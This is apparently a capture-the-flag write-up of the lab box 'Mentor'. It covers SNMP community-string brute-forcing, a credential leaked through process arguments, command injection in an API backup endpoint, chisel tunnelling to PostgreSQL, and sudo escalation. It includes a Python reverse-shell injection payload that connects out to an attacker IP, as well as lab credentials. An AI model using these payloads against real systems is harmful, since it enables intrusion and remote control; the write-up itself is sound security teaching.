#Linux #SNMP #SNMPBrute #api #FastAPI #JWT #CMDInjection #docker #chisel #PostgreSQL #credentialhunting #sudo

## Overview

Mentor is a medium Linux box built around an API with two separate SNMP secrets that drive the chain. The main site hosts a quotes API with Swagger docs. SNMP community-string brute-forcing with the `internal` string leaks a process argument containing a password. That password authenticates to the API as `james`, an admin account whose `/admin/backup` endpoint is vulnerable to command injection. The injection lands in a Docker container; credential hunting in the container's source code leads to a PostgreSQL database that yields the `svc` user's MD5 hash. SSH as `svc`, then a second SNMP config file on the host discloses another password that belongs to `james`. `james` can run `/bin/sh` as root via sudo.

## Recon

### SNMP Enumeration

Port 80 redirected to `mentorquotes.htb`. Nmap also found UDP 161 (SNMP). Initial `snmp-check` with the `public` community string returned basic system info:

```sh
snmp-check v1.9 - SNMP enumerator
Host IP address : 10.129.228.102
Hostname        : mentor
Description     : Linux mentor 5.15.0-56-generic ...
Contact         : Me <admin@mentorquotes.htb>
```

### Subdomain Discovery → API

```sh
ffuf -u http://10.129.228.102 -H "Host: FUZZ.mentorquotes.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 18 -mc all
# api -> 404 (different from non-existent subdomains)
```

Added `api.mentorquotes.htb` to `/etc/hosts`.

### API Endpoint Discovery

```sh
feroxbuster -u http://api.mentorquotes.htb --no-recursion --methods GET,POST
307 http://api.mentorquotes.htb/admin
200 http://api.mentorquotes.htb/docs
200 http://api.mentorquotes.htb/openapi.json
307 http://api.mentorquotes.htb/users
307 http://api.mentorquotes.htb/quotes
```

Swagger docs at `/docs` exposed the API structure and an email: `james@mentorquotes.htb`.

## Foothold

### API Account Creation and Auth Quirk

`/auth/signup` accepted arbitrary credentials. Logging in via `/auth/login` returned a JWT. The API rejected standard `Authorization: Bearer <token>` headers but worked when the `Bearer` prefix was removed:

```http
Authorization: eyJ0eXAiOiJKV1Qi...
```

Without admin rights, user-level endpoints returned 403. The JWT identified the account role.

### SNMP Community String Brute-Force → james's Password

The default `public` string only returned basic info. Brute-forcing community strings:

```sh
python3 snmpbrute.py -t 10.129.228.102
# Identified Community strings:
#   internal  (v2c)(RO)
#   public    (v1/v2c)(RO)
```

Running `snmpbulkwalk` with the `internal` community string and filtering for process arguments:

```sh
snmpbulkwalk -v2c -c internal -m ALL 10.129.228.102 | grep login.py
HOST-RESOURCES-MIB::hrSWRunParameters.2078 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```

> **Why process arguments appear in SNMP:** the `hrSWRunParameters` OID from the Host Resources MIB stores the full command-line arguments of every running process. If a script passes a credential as a CLI argument rather than reading it from an environment variable or config file, it's visible to anyone with SNMP read access.

Using `james@mentorquotes.htb` / `james` / `kj23sadkj123as0-d213` at `/auth/login` returned an admin-level JWT.

### Command Injection in /admin/backup

The `/admin/backup` endpoint accepts a `path` JSON field. Any value returned `{"INFO":"Done!"}`, which indicated a backend command like `tar` or `zip` was running. Testing for injection:

```http
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
Authorization: eyJ0eXAi...
Content-Type: application/json

{"path":"test;ping -c 1 10.10.14.126;"}
```

TCPDump confirmed ICMP from the server. The trailing semicolon was required.

> **Command injection in backup endpoints:** backup functionality often shells out to system commands. When the attacker-controlled `path` is passed unsanitized to something like `os.system(f"zip -r backup.zip {path}")`, semicolons or backticks inject additional commands.

Standard bash reverse shells were blocked. The server runs Python (Alpine Docker), so:

```http
{"path": ";python -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.126\",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';" }
```

```sh
rlwrap nc -lvnp 443
/app # whoami
root
```

Root inside the container (172.22.0.3). The user flag was in `/home/svc`.

## Privilege Escalation

### Container Escape → SSH as svc (PostgreSQL Hash)

The Dockerfile and `db.py` inside `/app/app/` revealed the database connection:

```python
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
```

Chisel forwarded port 5432 from the Docker gateway (172.22.0.1) to Kali:

```sh
# Kali
./chisel_1.9.1_linux_amd64 server -p 4444 --reverse
# Container
./chisel_1.9.1_linux_amd64 client 10.10.14.126:4444 R:5432:172.22.0.1:5432
```

```sh
psql -h 127.0.0.1 -p 5432 -U postgres
```

```sql
\connect mentorquotes_db
select * from users;
 1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
 2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
```

Crackstation cracked the `svc` MD5 hash. `james`'s hash was not found:

```
53f22d0dfa10dce7e29cd31f4f953fd8 -> ‹redacted›
```

```sh
ssh svc@mentorquotes.htb
# Password: ‹redacted›
whoami
svc
```

### svc → james → root (SNMP Config Credential)

Grepping the SNMP daemon config (removing commented lines):

```sh
cat /etc/snmp/snmpd.conf | grep -v "^#"
createUser bootstrap MD5 SuperSecurePassword123__ DES
```

The password `SuperSecurePassword123__` did not work for root but did work for `james`:

```sh
su james
# Password: SuperSecurePassword123__
james@mentor:/etc/snmp$ sudo -l
User james may run the following commands on mentor:
    (ALL) /bin/sh
```

```sh
sudo /bin/sh -p
# whoami
root
```

## Root

```
# cat /root/root.txt
‹redacted›
```

## Takeaways

- **SNMP community strings beyond `public` often expose process argument data.** Always brute-force them; `internal` and `private` are common non-default strings that yield far more information.
- **Process arguments in SNMP (`hrSWRunParameters`) leak credentials** when scripts accept passwords via CLI flags instead of environment variables.
- **Docker containers restrict shell utilities but Python is often available.** When bash reverse shells fail, try a one-liner in whatever runtime the app uses.
- **Config files for daemons like SNMP are worth reading in full** after gaining initial access; `snmpd.conf` stored a credential that led directly to a sudo escalation.
